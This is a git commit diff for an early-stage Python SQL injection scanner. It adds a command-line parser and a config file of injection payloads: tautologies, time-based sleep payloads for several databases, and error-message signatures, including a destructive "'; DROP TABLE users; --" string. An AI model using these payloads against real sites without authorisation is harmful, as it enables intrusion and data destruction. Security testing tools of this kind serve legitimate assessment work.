05810ea2b894dcfd4e1ec3482d0f6f77f8519ba7
mrsi13nt <androgeme0@gmail.com>
2024-02-18 16:10:49 +0200

    add more futures

--- black_candle.py
+++ black_candle.py
@@ -3,7 +3,7 @@ import sys
 import time
 from bs4 import BeautifulSoup
 import json
-import optparse
+import argparse
 from function import *
 from logo import *
 
@@ -11,3 +11,31 @@ from logo import *
 
 
 # new main page
+
+
+def main():
+    usage = "usage: python3 black_candle.py [options] arg"
+    parser = argparse.ArgumentParser(
+                    prog='black candle',
+                    description='a simple sql scanner',
+                    epilog='Text at the bottom of help',
+                    usage='%(prog)s -u URL')
+    request_group = parser.add_argument_group('Request')
+    request_group.add_argument('--data', dest='data', metavar='"data"', help='Data string to be sent through POST (e.g. "id=1")')
+    request_group.add_argument('--cookie', dest='cookie', metavar='"cookies"', help='HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")')
+    detection_group = parser.add_argument_group('Detection')
+    detection_group.add_argument('--level',dest='level', metavar='int', action='store', type=int, help='the level of scan from 1 to 3 (default 1)')
+    output_group = parser.add_argument_group('Output')
+    output_group.add_argument('-o', dest='output', metavar='string', type=argparse.FileType('w', encoding='latin-1'), help='file to write output to')
+    parser.add_argument('-u', '--url', dest='url', action='store', metavar='URL', required=True, help='Target URL (e.g. "http://www.site.com/vuln.php?id=1")')
+    parser.add_argument('-l', '--list', dest='urlist', action='store', metavar='file_path', help='target list of urls')
+    args = parser.parse_args()
+
+    # check the target url or list
+    if not args.url and not args.urlist:
+        print("Error: Either -u/--url or -l/--list option is required.")
+        parser.print_help()
+        sys.exit(1)
+
+if __name__ == '__main__':
+    main()
--- config.py
+++ config.py
@@ -1,8 +1,47 @@
 import random
 
-payloads = ['','']
+payloads_quotes = ["\"","'"]
 
-payloads_timebased = ['']
+payloads_comments = [
+    "--",
+    "-- -",
+    "#",
+    ";"
+]
 
-errors_msgs = ['']
+BlindTrue = [
+    "AND 1=1",
+]
+
+BlindFalse = [
+    "AND 1=2"
+]
+
+boolean_based_payloads = [
+        "' OR '1'='1'",
+        "' OR '1'='1' --",
+        "'; DROP TABLE users; --"
+    ]
+
+
+
+time_based_payloads = [
+    "SELECT SLEEP(2)",          # MySQL
+    "SELECT PG_SLEEP(2)",       # PostGreSQL
+    "WAITFOR DELAY '00:00:01'", # MSSQL
+    "sqlite3_sleep(2000)"       # SQLite3
+]
+
+errors_msgs = [
+    # ======== SQLite3 ========
+    "<b>Warning</b>:  SQLite3",
+    "unrecognized token:",
+    "Unable to prepare statement:",
+    # ======== MySQL =========
+    "You have an error in your SQL",
+    "MySQL server version for the right syntax",
+    "supplied argument is not a valid MySQL result resource",
+    # ======== PostgreSQL ========
+    "ERROR:  syntax error"
+]
 
